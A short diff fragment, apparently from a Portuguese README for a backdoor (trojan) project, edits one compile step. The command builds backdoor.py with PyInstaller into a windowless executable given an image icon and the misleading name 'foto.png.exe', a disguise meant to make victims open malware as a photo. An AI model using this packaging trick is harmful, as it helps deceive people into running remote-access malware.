@@ -20,4 +20,4 @@ Backdoor ou popularmente conhecido como cavalo de tróia, é um tipo de vírus q
 
 # COMPILAR O BACKDOOR
 
-    -pyinstaller -F --clean -w backdoor.py -i icone.png -n foto.png.exe
+    ~$ pyinstaller -F --clean -w backdoor.py -i icone.png -n foto.png.exe
